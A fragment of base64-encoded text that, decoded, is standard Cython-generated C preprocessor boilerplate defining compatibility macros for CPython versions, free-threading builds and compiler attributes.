USE9OX1BFUDQ4N19JTklUX1NVQkNMQVNTXG4gICAgI2RlZmluZSBDWVRIT05fUEVQNDg3X0lOSVRfU1VCQ0xBU1MgMVxuICAjZW5kaWZcbiAgI2lmbmRlZiBDWVRIT05fUEVQNDg5X01VTFRJX1BIQVNFX0lOSVRcbiAgICAjZGVmaW5lIENZVEhPTl9QRVA0ODlfTVVMVElfUEhBU0VfSU5JVCAxXG4gICNlbmRpZlxuICAjaWZuZGVmIENZVEhPTl9VU0VfTU9EVUxFX1NUQVRFXG4gICAgI2RlZmluZSBDWVRIT05fVVNFX01PRFVMRV9TVEFURSAwXG4gICNlbmRpZlxuICAjdW5kZWYgQ1lUSE9OX1VTRV9TWVNfTU9OSVRPUklOR1xuICAjZGVmaW5lIENZVEhPTl9VU0VfU1lTX01PTklUT1JJTkcgMFxuICAjaWZuZGVmIENZVEhPTl9VU0VfVFBfRklOQUxJWkVcbiAgICAjZGVmaW5lIENZVEhPTl9VU0VfVFBfRklOQUxJWkUgMFxuICAjZW5kaWZcbiAgI2lmbmRlZiBDWVRIT05fVVNFX0FNX1NFTkRcbiAgICAjZGVmaW5lIENZVEhPTl9VU0VfQU1fU0VORCAoX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA+PSAweDAzMEEwMDAwKVxuICAjZW5kaWZcbiAgI3VuZGVmIENZVEhPTl9VU0VfRElDVF9WRVJTSU9OU1xuICAjZGVmaW5lIENZVEhPTl9VU0VfRElDVF9WRVJTSU9OUyAwXG4gICN1bmRlZiBDWVRIT05fVVNFX0VYQ19JTkZPX1NUQUNLXG4gICNkZWZpbmUgQ1lUSE9OX1VTRV9FWENfSU5GT19TVEFDSyAwXG4gICNpZm5kZWYgQ1lUSE9OX1VQREFURV9ERVNDUklQVE9SX0RPQ1xuICAgICNkZWZpbmUgQ1lUSE9OX1VQREFURV9ERVNDUklQVE9SX0RPQyAwXG4gICNlbmRpZlxuICAjaWZuZGVmIENZVEhPTl9VU0VfRlJFRUxJU1RTXG4gICNkZWZpbmUgQ1lUSE9OX1VTRV9GUkVFTElTVFMgMVxuICAjZW5kaWZcbiAgI3VuZGVmIENZVEhPTl9JTU1PUlRBTF9DT05TVEFOVFNcbiAgI2RlZmluZSBDWVRIT05fSU1NT1JUQUxfQ09OU1RBTlRTIDBcbiNlbHNlXG4gICNkZWZpbmUgQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZIDBcbiAgI2RlZmluZSBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04gMVxuICAjZGVmaW5lIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgMFxuICAjZGVmaW5lIENZVEhPTl9DT01QSUxJTkdfSU5fR1JBQUwgMFxuICAjaWZkZWYgUHlfR0lMX0RJU0FCTEVEXG4gICAgI2RlZmluZSBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05fRlJFRVRIUkVBRElORyAxXG4gICNlbHNlXG4gICAgI2RlZmluZSBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05fRlJFRVRIUkVBRElORyAwXG4gICNlbmRpZlxuICAjaWYgUFlfVkVSU0lPTl9IRVggPCAweDAzMEEwMDAwXG4gICAgI3VuZGVmIENZVEhPTl9VU0VfVFlQRV9TTE9UU1xuICAgICNkZWZpbmUgQ1lUSE9OX1VTRV9UWVBFX1NMT1RTIDFcbiAgI2VsaWYgIWRlZmluZWQoQ1lUSE9OX1VTRV9UWVBFX1NMT1RTKVxuICAgICNkZWZpbmUgQ1lUSE9OX1VTRV9UWVBFX1NMT1RTIDFcbiAgI2VuZGlmXG4gICNpZm5kZWYgQ1lUSE9OX1VTRV9UWVBFX1NQRUNTXG4gICAgI2RlZmluZSBDWVRIT05fVVNFX1RZUEVfU1BFQ1MgMFxuICAjZW5kaWZcbiAgI2lmbmRlZiBDWVRIT05fVVNFX1BZVFlQRV9MT09LVVBcbiAgICAjZGVmaW5lIENZVEhPTl9VU0VfUFlUWVBFX0xPT0tVUCAxXG4gICNlbmRpZlxuICAjaWZuZGVmIENZVEhPTl9VU0VfUFlMT05HX0lOVEVSTkFMU1xuICAgICNkZWZpbmUgQ1lUSE9OX1VTRV9QWUxPTkdfSU5URVJOQUxTIDFcbiAgI2VuZGlmXG4gICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05fRlJFRVRIUkVBRElOR1xuICAgICN1bmRlZiBDWVRIT05fVVNFX1BZTElTVF9JTlRFUk5BTFNcbiAgICAjZGVmaW5lIENZVEhPTl9VU0VfUFlMSVNUX0lOVEVSTkFMUyAwXG4gICNlbGlmICFkZWZpbmVkKENZVEhPTl9VU0VfUFlMSVNUX0lOVEVSTkFMUylcbiAgICAjZGVmaW5lIENZVEhPTl9VU0VfUFlMSVNUX0lOVEVSTkFMUyAxXG4gICNlbmRpZlxuICAjaWZuZGVmIENZVEhPTl9VU0VfVU5JQ09ERV9JTlRFUk5BTFNcbiAgICAjZGVmaW5lIENZVEhPTl9VU0VfVU5JQ09ERV9JTlRFUk5BTFMgMVxuICAjZW5kaWZcbiAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTl9GUkVFVEhSRUFESU5HIHx8IFBZX1ZFUlNJT05fSEVYID49IDB4MDMwQjAwQTJcbiAgICAjdW5kZWYgQ1lUSE9OX1VTRV9VTklDT0RFX1dSSVRFUlxuICAgICNkZWZpbmUgQ1lUSE9OX1VTRV9VTklDT0RFX1dSSVRFUiAwXG4gICNlbGlmICFkZWZpbmVkKENZVEhPTl9VU0VfVU5JQ09ERV9XUklURVIpXG4gICAgI2RlZmluZSBDWVRIT05fVVNFX1VOSUNPREVfV1JJVEVSIDFcbiAgI2VuZGlmXG4gICNpZm5kZWYgQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlNcbiAgICAjZGVmaW5lIENZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTIDBcbiAgI2VuZGlmXG4gICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05fRlJFRVRIUkVBRElOR1xuICAgICN1bmRlZiBDWVRIT05fQVZPSURfVEhSRUFEX1VOU0FGRV9CT1JST1dFRF9SRUZTXG4gICAgI2RlZmluZSBDWVRIT05fQVZPSURfVEhSRUFEX1VOU0FGRV9CT1JST1dFRF9SRUZTIDFcbiAgI2VsaWYgIWRlZmluZWQoQ1lUSE9OX0FWT0lEX1RIUkVBRF9VTlNBRkVfQk9SUk9XRURfUkVGUylcbiAgICAjZGVmaW5lIENZVEhPTl9BVk9JRF9USFJFQURfVU5TQUZFX0JPUlJPV0VEX1JFRlMgMFxuICAjZW5kaWZcbiAgI2lmbmRlZiBDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TXG4gICAgI2RlZmluZSBDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TIDFcbiAgI2VuZGlmXG4gICNpZm5kZWYgQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkVcbiAgICAjZGVmaW5lIENZVEhPTl9BU1NVTUVfU0FGRV9TSVpFIDFcbiAgI2VuZGlmXG4gICNpZm5kZWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTXG4gICAgI2RlZmluZSBDWVRIT05fVU5QQUNLX01FVEhPRFMgMVxuICAjZW5kaWZcbiAgI2lmbmRlZiBDWVRIT05fRkFTVF9USFJFQURfU1RBVEVcbiAgICAjZGVmaW5lIENZVEhPTl9GQVNUX1RIUkVBRF9TVEFURSAxXG4gICNlbmRpZlxuICAjaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OX0ZSRUVUSFJFQURJTkdcbiAgICAjdW5kZWYgQ1lUSE9OX0ZBU1RfR0lMXG4gICAgI2RlZmluZSBDWVRIT05fRkFTVF9HSUwgMFxuICAjZWxpZiAhZGVmaW5lZChDWVRIT05fRkFTVF9HSUwpXG4gICAgI2RlZmluZSBDWVRIT05fRkFTVF9HSUwgKFBZX1ZFUlNJT05fSEVYIDwgMHgwMzBDMDBBNilcbiAgI2VuZGlmXG4gICNpZm5kZWYgQ1lUSE9OX01FVEhfRkFTVENBTExcbiAgICAjZGVmaW5lIENZVEhPTl9NRVRIX0ZBU1RDQUxMIDFcbiAgI2VuZGlmXG4gICNpZm5kZWYgQ1lUSE9OX0ZBU1RfUFlDQUxMXG4gICAgI2RlZmluZSBDWVRIT05fRkFTVF9QWUNBTEwgMVxuICAjZW5kaWZcbiAgI2lmbmRlZiBDWVRIT05fUEVQNDg3X0lOSVRfU1VCQ0xBU1NcbiAgICAjZGVmaW5lIENZVEhPTl9QRVA0ODdfSU5JVF9TVUJDTEFTUyAxXG4gICNlbmRpZlxuICAjaWZuZGVmIENZVEhPTl9QRVA0ODlfTVVMVElfUEhBU0VfSU5JVFxuICAgICNkZWZpbmUgQ1lUSE9OX1BFUDQ4OV9NVUxUSV9QSEFTRV9JTklUIDFcbiAgI2VuZGlmXG4gICNpZm5kZWYgQ1lUSE9OX1VTRV9NT0RVTEVfU1RBVEVcbiAgICAjZGVmaW5lIENZVEhPTl9VU0VfTU9EVUxFX1NUQVRFIDBcbiAgI2VuZGlmXG4gICNpZm5kZWYgQ1lUSE9OX1VTRV9TWVNfTU9OSVRPUklOR1xuICAgICNkZWZpbmUgQ1lUSE9OX1VTRV9TWVNfTU9OSVRPUklORyAoUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBkMDBCMSlcbiAgI2VuZGlmXG4gICNpZm5kZWYgQ1lUSE9OX1VTRV9UUF9GSU5BTElaRVxuICAgICNkZWZpbmUgQ1lUSE9OX1VTRV9UUF9GSU5BTElaRSAxXG4gICNlbmRpZlxuICAjaWZuZGVmIENZVEhPTl9VU0VfQU1fU0VORFxuICAgICNkZWZpbmUgQ1lUSE9OX1VTRV9BTV9TRU5EIDFcbiAgI2VuZGlmXG4gICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05fRlJFRVRIUkVBRElOR1xuICAgICN1bmRlZiBDWVRIT05fVVNFX0RJQ1RfVkVSU0lPTlNcbiAgICAjZGVmaW5lIENZVEhPTl9VU0VfRElDVF9WRVJTSU9OUyAwXG4gICNlbGlmICFkZWZpbmVkKENZVEhPTl9VU0VfRElDVF9WRVJTSU9OUylcbiAgICAjZGVmaW5lIENZVEhPTl9VU0VfRElDVF9WRVJTSU9OUyAgKFBZX1ZFUlNJT05fSEVYIDwgMHgwMzBDMDBBNSAmJiAhQ1lUSE9OX1VTRV9NT0RVTEVfU1RBVEUpXG4gICNlbmRpZlxuICAjaWZuZGVmIENZVEhPTl9VU0VfRVhDX0lORk9fU1RBQ0tcbiAgICAjZGVmaW5lIENZVEhPTl9VU0VfRVhDX0lORk9fU1RBQ0sgMVxuICAjZW5kaWZcbiAgI2lmbmRlZiBDWVRIT05fVVBEQVRFX0RFU0NSSVBUT1JfRE9DXG4gICAgI2RlZmluZSBDWVRIT05fVVBEQVRFX0RFU0NSSVBUT1JfRE9DIDFcbiAgI2VuZGlmXG4gICNpZm5kZWYgQ1lUSE9OX1VTRV9GUkVFTElTVFNcbiAgICAjZGVmaW5lIENZVEhPTl9VU0VfRlJFRUxJU1RTICghQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OX0ZSRUVUSFJFQURJTkcpXG4gICNlbmRpZlxuICAjaWYgZGVmaW5lZChDWVRIT05fSU1NT1JUQUxfQ09OU1RBTlRTKSAmJiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwQzAwMDBcbiAgICAjdW5kZWYgQ1lUSE9OX0lNTU9SVEFMX0NPTlNUQU5UU1xuICAgICNkZWZpbmUgQ1lUSE9OX0lNTU9SVEFMX0NPTlNUQU5UUyAwICAvLyBkZWZpbml0ZWx5IHdvblwndCB3b3JrXG4gICNlbGlmICFkZWZpbmVkKENZVEhPTl9JTU1PUlRBTF9DT05TVEFOVFMpXG4gICAgI2RlZmluZSBDWVRIT05fSU1NT1JUQUxfQ09OU1RBTlRTIChQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEMwMDAwICYmICFDWVRIT05fVVNFX01PRFVMRV9TVEFURSAmJiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05fRlJFRVRIUkVBRElORylcbiAgI2VuZGlmXG4jZW5kaWZcbiNpZm5kZWYgQ1lUSE9OX0NPTVBSRVNTX1NUUklOR1NcbiAgI2RlZmluZSBDWVRIT05fQ09NUFJFU1NfU1RSSU5HUyAxXG4jZW5kaWZcbiNpZm5kZWYgQ1lUSE9OX0ZBU1RfUFlDQ0FMTFxuI2RlZmluZSBDWVRIT05fRkFTVF9QWUNDQUxMICBDWVRIT05fRkFTVF9QWUNBTExcbiNlbmRpZlxuI2lmbmRlZiBDWVRIT05fVkVDVE9SQ0FMTFxuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiNkZWZpbmUgQ1lUSE9OX1ZFQ1RPUkNBTEwgIChfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYID49IDB4MDMwQzAwMDApXG4jZWxzZVxuI2RlZmluZSBDWVRIT05fVkVDVE9SQ0FMTCAgKENZVEhPTl9GQVNUX1BZQ0NBTEwpXG4jZW5kaWZcbiNlbmRpZlxuI2lmIENZVEhPTl9VU0VfUFlMT05HX0lOVEVSTkFMU1xuICAjdW5kZWYgU0hJRlRcbiAgI3VuZGVmIEJBU0VcbiAgI3VuZGVmIE1BU0tcbiAgI2lmZGVmIFNJWkVPRl9WT0lEX1BcbiAgICBlbnVtIHsgX19weXhfY2hlY2tfc2l6ZW9mX3ZvaWRwID0gMSAvIChpbnQpKFNJWkVPRl9WT0lEX1AgPT0gc2l6ZW9mKHZvaWQqKSkgfTtcbiAgI2VuZGlmXG4jZW5kaWZcbiNpZm5kZWYgX19oYXNfYXR0cmlidXRlXG4gICNkZWZpbmUgX19oYXNfYXR0cmlidXRlKHgpIDBcbiNlbmRpZlxuI2lmbmRlZiBfX2hhc19jcHBfYXR0cmlidXRlXG4gICNkZWZpbmUgX19oYXNfY3BwX2F0dHJpYnV0ZSh4KSAwXG4jZW5kaWZcbiNpZm5kZWYgQ1lUSE9OX1JFU1RSSUNUXG4gICNpZiBkZWZpbmVkKF9fR05VQ19fKVxuICAgICNkZWZpbmUgQ1lUSE9OX1JFU1RSSUNUIF9fcmVzdHJpY3RfX1xuICAjZWxpZiBkZWZpbmVkKF9NU0NfVkVSKSAmJiBfTVNDX1ZFUiA+PSAxNDAwXG4gICAgI2RlZmluZSBDWVRIT05fUkVTVFJJQ1QgX19yZXN0cmljdFxuICAjZWxpZiBkZWZpbmVkIChfX1NURENfVkVSU0lPTl9fKSAmJiBfX1NURENfVkVSU0lPTl9fID49IDE5OTkwMUxcbiAgICAjZGVmaW5lIENZVEhPTl9SRVNUUklDVCByZXN0cmljdFxuICAjZWxzZVxuICAgICNkZWZpbmUgQ1lUSE9OX1JFU1RSSUNUXG4gICNlbmRpZlxuI2VuZGlmXG4jaWZuZGVmIENZVEhPTl9VTlVTRURcbiAgI2lmIGRlZmluZWQoX19jcGx1c3BsdXMpXG4gICAgXG4gICAgI2lmICgoZGVmaW5lZChfTVNWQ19MQU5HKSAmJiBfTVNWQ19MQU5HID49IDIwMTcwM0wpIHx8IF9fY3BsdXNwbHVzID49IDIwMTcwM0wpXG4gICAgICAjaWYgX19oYXNfY3BwX2F0dHJpYnV0ZShtYXliZV91bnVzZWQpXG4gICAgICAgICNkZWZpbmUgQ1lUSE9OX1VOVVNFRCBbW21heWJlX3VudXNlZF1dXG4gICAgICAjZW5kaWZcbiAgICAjZW5kaWZcbiAgI2VuZGlmXG4jZW5kaWZcbiNpZm5kZWYgQ1lUSE9OX1VOVVNFRFxuIyBpZiBkZWZpbmVkKF9fR05VQ19fKVxuIyAgIGlmICEoZGVmaW5lZChfX2NwbHVzcGx1cykpIHx8IChfX0dOVUNfXyA+IDMgfHwgKF9fR05VQ19fID09IDMgJiYgX19HTlVDX01JTk9SX18gPj0gNCkpXG4jICAgICBkZWZpbmUgQ1lUSE9OX1VOVVNFRCBfX2F0dHJpYnV0ZV9fICgoX191bnVzZWRfXykpXG4jICAgZWxzZVxuIyAgICAgZGVmaW5lIENZVEhPTl9VTlVTRURcbiMgICBlbmRpZlxuIyBlbGlmIGRlZmluZWQoX19JQ0MpIHx8IChkZWZpbmVkKF9fSU5URUxfQ09NUElMRVIpICYmICFkZWZpbmVkKF9NU0NfVkVSKSlcbiMgICBkZWZpbmUgQ1lUSE9OX1VOVVNFRCBfX2F0dHJpYnV0ZV9fICgoX191bnVzZWRfXykpXG4jIGVsc2VcbiMgICBkZWZpbmUgQ1lUSE9OX1VOVVNFRFxuIyBlbmRpZlxuI2VuZGlmXG4jaWZuZGVmIENZVEhPTl9VTlVTRURfVkFSXG4jICBpZiBkZWZpbmVkKF9fY3BsdXNwbHVzKVxuICAgICB0ZW1wbGF0ZTxjbGFzcyBUPiB2b2lkIENZVEhPTl9VTlVTRURfVkFSKCBjb25zdCBUJiApIHsgfVxuIyAgZWxzZVxuIyAgICBkZWZpbmUgQ1lUSE9OX1VOVVNFRF9WQVIoeCkgKHZvaWQpKHgpXG4jICBlbmRpZlxuI2VuZGlmXG4jaWZuZGVmIENZVEhPTl9NQVlCRV9VTlVTRURfVkFSXG4gICNkZWZpbmUgQ1lUSE9OX01BWUJFX1VOVVNFRF9WQVIoeCkgQ1lUSE9OX1VOVVNFRF9WQVIoeClcbiNlbmRpZlxuI2lmbmRlZiBDWVRIT05fTkNQX1VOVVNFRFxuIyBpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04gJiYgIUNZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTl9GUkVFVEhSRUFESU5HXG4jICBkZWZpbmUgQ1lUSE9OX05DUF9VTlVTRURcbiMgZWxzZVxuIyAgZGVmaW5lIENZVEhPTl9OQ1BfVU5VU0VEIENZVEhPTl9VTlVTRURcbiMgZW5kaWZcbiNlbmRpZlxuI2lmbmRlZiBDWVRIT05fVVNFX0NQUF9TVERfTU9WRVxuICAjaWYgZGVmaW5lZChfX2NwbHVzcGx1cykgJiYgKFxcXG4gICAgX19jcGx1c3BsdXMgPj0gMjAxMTAzTCB8fCAoZGVmaW5lZChfTVNDX1ZFUikgJiYgX01TQ19WRVIgPj0gMTYwMCkpXG4gICAgI2RlZmluZSBDWVRIT05fVVNFX0NQUF9TVERfTU9WRSAxXG4gICNlbHNlXG4gICAgI2RlZmluZSBDWVRIT05fVVNFX0NQUF9TVERfTU9WRSAwXG4gICNlbmRpZlxuI2VuZGlmXG4jZGVmaW5lIF9fUHl4X3ZvaWRfdG9fTm9uZSh2b2lkX3Jlc3VsdCkgKCh2b2lkKSh2b2lkX3Jlc3VsdCksIFB5X0lOQ1JFRihQeV9Ob25lKSwgUHlfTm9uZSlcbiNpbmNsdWRlIDxzdGRpbnQuaD5cbnR5cGVkZWYgdWludHB0cl90ICBfX3B5eF91aW50cHRyX3Q7XG4jaWZuZGVmIENZVEhPTl9GQUxMVEhST1VHSFxuICAjaWYgZGVmaW5lZChfX2NwbHVzcGx1cylcbiAgICBcbiAgICAjaWYgKChkZWZpbmVkKF9NU1ZDX0xBTkcpICYmIF9NU1ZDX0xBTkcgPj0gMjAxNzAzTCkgfHwgX19jcGx1c3BsdXMgPj0gMjAxNzAzTClcbiAgICAgICNpZiBfX2hhc19jcHBfYXR0cmlidXRlKGZhbGx0aHJvdWdoKVxuICAgICAgICAjZGVmaW5lIENZVEhPTl9GQUxMVEhST1VHSCBbW2ZhbGx0aHJvdWdoXV1cbiAgICAgICNlbmRpZlxuICAgICNlbmRpZlxuICAgICNpZm5kZWYgQ1lUSE9OX0ZBTExUSFJPVUdIXG4gICAgICAjaWYgX19oYXNfY3BwX2F0dHJpYnV0ZShjbGFuZzo6ZmFsbHRocm91Z2gpXG4gICAgICAgICNkZWZpbmUgQ1lUSE9OX0ZBTExUSFJPVUdIIFtbY2xhbmc6OmZhbGx0aHJvdWdoXV1cbiAgICAgICNlbGlmIF9faGFzX2NwcF9hdHRyaWJ1dGUoZ251OjpmYWxsdGhyb3VnaClcbiAgICAgICAgI2RlZmluZSBDWVRIT05fRkFMTFRIUk9VR0ggW1tnbnU6OmZhbGx0aHJvdWdoXV1cbiAgICAgICNlbmRpZlxuICAgICNlbmRpZlxuICAjZW5kaWZcbiAgI2lmbmRlZiBDWVRIT05fRkFMTFRIUk9VR0hcbiAgICAjaWYgX19oYXNfYXR0cmlidXRlKGZhbGx0aHJvdWdoKVxuICAgICAgI2RlZmluZSBDWVRIT05fRkFMTFRIUk9VR0ggX19hdHRyaWJ1dGVfXygoZmFsbHRocm91Z2gpKVxuICAgICNlbHNlXG4gICAgICAjZGVmaW5lIENZVEhPTl9GQUxMVEhST1VHSFxuICAgICNlbmRpZlxuICAjZW5kaWZcbiAgI2lmIGRlZmluZWQoX19jbGFuZ19fKSAmJiBkZWZpbmVkKF9fYXBwbGVfYnVpbGRfdmVyc2lvbl9fKVxuICAgICNpZiBfX2FwcGxlX2J1aWxkX3ZlcnNpb25fXyA8IDcwMDAwMDBcbiAgICAgICN1bmRlZiAgQ1lUSE9OX0ZBTExUSFJPVUdIXG4gICAgICAjZGVmaW5lIENZVEhPTl9GQUxMVEhST1VHSFxuICAgICNlbmRpZlxuICAjZW5kaWZcbiNlbmRpZlxuI2lmbmRlZiBQeV9VTlJFQUNIQUJMRVxuICAjZGVmaW5lIFB5X1VOUkVBQ0hBQkxFKCkgIGFzc2VydCgwKTsgYWJvcnQoKVxuI2VuZGlmXG4jaWZkZWYgX19jcGx1c3BsdXNcbiAgdGVtcGxhdGUgPHR5cGVuYW1lIFQ+XG4gIHN0cnVjdCBfX1BZWF9JU19VTlNJR05FRF9JTVBMIHtzdGF0aWMgY29uc3QgYm9vbCB2YWx1ZSA9IFQoMCkgPCBUKC0xKTt9O1xuICAjZGVmaW5lIF9fUFlYX0lTX1VOU0lHTkVEKHR5cGUpIChfX1BZWF9JU19VTlNJR05FRF9JTVBMPHR5cGU+Ojp2YWx1ZSlcbiNlbHNlXG4gICNkZWZpbmUgX19QWVhfSVNfVU5TSUdORUQodHlwZSkgKCgodHlwZSktMSkgPiAwKVxuI2VuZGlmXG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZID09IDFcbiAgI2RlZmluZSBfX1BZWF9ORUVEX1RQX1BSSU5UX1NMT1QgIChQWV9WRVJTSU9OX0hFWCA8IDB4MDMwQTAwMDApXG4jZWxzZVxuICAjZGVmaW5lIF9fUFlYX05FRURfVFBfUFJJTlRfU0xPVCAgKFBZX1ZFUlNJT05fSEVYIDwgMHgwMzA5MDAwMClcbiNlbmRpZlxuI2RlZmluZSBfX1BZWF9SRUlOVEVSUFJFVF9GVU5DSU9OKGZ1bmNfcG9pbnRlciwgb3RoZXJfcG9pbnRlcikgKChmdW5jX3BvaW50ZXIpKHZvaWQoKikodm9pZCkpKG90aGVyX3BvaW50ZXIpKVxuXG5cbiNpZm5kZWYgQ1lUSE9OX0lOTElORVxuICAjaWYgZGVmaW5lZChfX2NsYW5nX18pXG4gICAgI2RlZmluZSBDWVRIT05fSU5MSU5FIF9faW5saW5lX18gX19hdHRyaWJ1dGVfXyAoKF9fdW51c2VkX18pKVxuICAjZWxpZiBkZWZpbmVkKF9fR05VQ19fKVxuICAgICNkZWZpbmUgQ1lUSE9OX0lOTElORSBfX2lubGluZV9fXG4gICNlbGlmIGRlZmluZWQoX01TQ19WRVIpXG4gICAgI2RlZmluZSBDWVRIT05fSU5MSU5FIF9faW5saW5lXG4gICNlbGlmIGRlZmluZWQgKF9fU1REQ19WRVJTSU9OX18pICYmIF9fU1REQ19WRVJTSU9OX18gPj0gMTk5OTAxTFxuICAgICNkZWZpbmUgQ1lUSE9OX0lOTElORSBpbmxpbmVcbiAgI2Vsc2VcbiAgICAjZGVmaW5lIENZVEhPTl9JTkxJTkVcbiAgI2VuZGlmXG4jZW5kaWZcblxuXG4jZGVmaW5lIF9fUFlYX0JVSUxEX1BZX1NTSVpFX1QgIm4iXG4jZGVmaW5lIENZVEhPTl9GT1JNQVRfU1NJWkVfVCAieiJcbiNkZWZpbmUgX19QeXhfQlVJTFRJTl9NT0RVTEVfTkFNRSAiYnVpbHRpbnMiXG4jZGVmaW5lIF9fUHl4X0RlZmF1bHRDbGFzc1R5cGUgUHlUeXBlX1R5cGVcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgI2lmbmRlZiBDT19PUFRJTUlaRURcbiAgICBzdGF0aWMgaW50IENPX09QVElNSVpFRDtcbiAgICAjZW5kaWZcbiAgICAjaWZuZGVmIENPX05FV0xPQ0FMU1xuICAgIHN0YXRpYyBpbnQgQ09fTkVXTE9DQUxTO1xuICAgICNlbmRpZlxuICAgICNpZm5kZWYgQ09fVkFSQVJHU1xuICAgIHN0YXRpYyBpbnQgQ09fVkFSQVJHUztcbiAgICAjZW5kaWZcbiAgICAjaWZuZGVmIENPX1ZBUktFWVdPUkRTXG4gICAgc3RhdGljIGludCBDT19WQVJLRVlXT1JEUztcbiAgICAjZW5kaWZcbiAgICAjaWZuZGVmIENPX0FTWU5DX0dFTkVSQVRPUlxuICAgIHN0YXRpYyBpbnQgQ09fQVNZTkNfR0VORVJBVE9SO1xuICAgICNlbmRpZlxuICAgICNpZm5kZWYgQ09fR0VORVJBVE9SXG4gICAgc3RhdGljIGludCBDT19HRU5FUkFUT1I7XG4gICAgI2VuZGlmXG4gICAgI2lmbmRlZiBDT19DT1JPVVRJTkVcbiAgICBzdGF0aWMgaW50IENPX0NPUk9VVElORTtcbiAgICAjZW5kaWZcbiNlbHNlXG4gICAgI2lmbmRlZiBDT19DT1JPVVRJTkVcbiAgICAgICNkZWZpbmUgQ09fQ09ST1VUSU5FIDB4ODBcbiAgICAjZW5kaWZcbiAgICAjaWZuZGVmIENPX0FTWU5DX0dFTkVSQVRPUlxuICAgICAgI2RlZmluZSBDT19BU1lOQ19HRU5FUkFUT1IgMHgyMDBcbiAgICAjZW5kaWZcbiNlbmRpZlxuc3RhdGljIGludCBfX1B5eF9pbml0X2NvX3ZhcmlhYmxlcyh2b2lkKTtcbiNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMDkwMEE0IHx8IGRlZmluZWQoUHlfSVNfVFlQRSlcbiAgI2RlZmluZSBfX1B5eF9JU19UWVBFKG9iLCB0eXBlKSBQeV9JU19UWVBFKG9iLCB0eXBlKVxuI2Vsc2VcbiAgI2RlZmluZSBfX1B5eF9JU19UWVBFKG9iLCB0eXBlKSAoKChjb25zdCBQeU9iamVjdCopb2IpLT5vYl90eXBlID09ICh0eXBlKSlcbiNlbmRpZlxuI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwQTAwQjEgfHwgZGVmaW5lZChQeV9JcylcbiAgI2RlZmluZSBfX1B5eF9QeV9Jcyh4LCB5KSAgUHlfSXMoeCwgeSlcbiNlbHNlXG4gICNkZWZpbmUgX19QeXhfUHlfSXMoeCwgeSkgKCh4KSA9PSAoeSkpXG4jZW5kaWZcbiNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEEwMEIxIHx8IGRlZmluZWQoUHlfSXNOb25lKVxuICAjZGVmaW5lIF9fUHl4X1B5X0lzTm9uZShvYikgUHlfSXNOb25lKG9iKVxuI2Vsc2VcbiAgI2RlZmluZSBfX1B5eF9QeV9Jc05vbmUob2IpIF9fUHl4X1B5X0lzKChvYiksIFB5X05vbmUpXG4jZW5kaWZcbiNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEEwMEIxIHx8IGRlZmluZWQoUHlfSXNUcnVlKVxuICAjZGVmaW5lIF9fUHl4X1B5X0lzVHJ1ZShvYikgUHlfSXNUcnVlKG9iKVxuI2Vsc2VcbiAgI2RlZmluZSBfX1B5eF9QeV9Jc1RydWUob2IpIF9fUHl4X1B5X0lzKChvYiksIFB5X1RydWUpXG4jZW5kaWZcbiNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEEwMEIxIHx8IGRlZmluZWQoUHlfSXNGYWxzZSlcbiAgI2RlZmluZSBfX1B5eF9QeV9Jc0ZhbHNlKG9iKSBQeV9Jc0ZhbHNlKG9iKVxuI2Vsc2VcbiAgI2RlZmluZSBfX1B5eF9QeV9Jc0ZhbHNlKG9iKSBfX1B5eF9QeV9Jcygob2IpLCBQeV9GYWxzZSlcbiNlbmRpZlxuI2RlZmluZSBfX1B5eF9Ob25lQXNOdWxsKG9iaikgIChfX1B5eF9QeV9Jc05vbmUob2JqKSA/IE5VTEwgOiAob2JqKSlcbiNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMDkwMEYwICYmICFDWVRIT05fQ09NUElMSU5HX0lOX1BZUFlcbiAgI2RlZmluZSBfX1B5eF9QeU9iamVjdF9HQ19Jc0ZpbmFsaXplZChvKSBQeU9iamVjdF9HQ19Jc0ZpbmFsaXplZChvKVxuI2Vsc2VcbiAgI2RlZmluZSBfX1B5eF9QeU9iamVjdF9HQ19Jc0ZpbmFsaXplZChvKSBfUHlHQ19GSU5BTElaRUQobylcbiNlbmRpZlxuI2lmbmRlZiBQeV9UUEZMQUdTX0NIRUNLVFlQRVNcbiAgI2RlZmluZSBQeV9UUEZMQUdTX0NIRUNLVFlQRVMgMFxuI2VuZGlmXG4jaWZuZGVmIFB5X1RQRkxBR1NfSEFWRV9JTkRFWFxuICAjZGVmaW5lIFB5X1RQRkxBR1NfSEFWRV9JTkRFWCAwXG4jZW5kaWZcbiNpZm5kZWYgUHlfVFBGTEFHU19IQVZFX05FV0JVRkZFUlxuICAjZGVmaW